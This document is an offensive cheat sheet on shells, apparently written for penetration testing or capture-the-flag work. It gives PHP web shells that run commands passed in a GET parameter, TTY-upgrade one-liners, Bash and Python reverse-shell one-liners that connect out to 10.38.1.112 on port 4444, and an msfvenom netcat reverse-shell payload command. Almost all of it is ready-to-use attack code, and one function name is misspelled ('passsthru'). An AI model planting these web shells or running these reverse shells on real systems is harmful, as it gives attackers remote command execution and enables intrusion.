# Shells

## Upgrade shell

```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Web Shell PHP

### POC
If you are unsure whether they are enabled on your system, the following will return a list of the dangerous functions that are enabled.
```php
<?php print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));?>
```

### Backtrick

```php
<?php system($_GET['cmd']);?>
'cmd' HTTP Request GET parameter -> e.g. "/shell.php?cmd=ls%20-la" 

<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
```

### system()
```php
// Return the listing of the directory where the file runs (Windows)
<?php system("dir"); ?>

// Return the listing of the directory where the file runs (Linux)
<?php system("ls -la"); ?>
```

### exec()

```php
// Executes but returns nothing
<?php exec("ls -la"); ?>

// Executes, returns only last line of the output
<?php echo exec("ls -la"); ?>
```

### shell_exec()

```php
// Executes, returns the entire output as a string
<?php echo shell_exec("ls -la"); ?>
```

### passthru()

```php
// Executes, returns output in raw format
<?php passsthru("ls -la"); ?>
```


## Reverse Shells

### Bash

```console
bash -i >& /dev/tcp/10.38.1.112/4444 0>&1
```

### Python

```console
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.38.1.112",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## msfvenom

```console
$ msfvenom -p cmd/unix/reverse_netcat lhost=VPN-IP lport=1337 R
```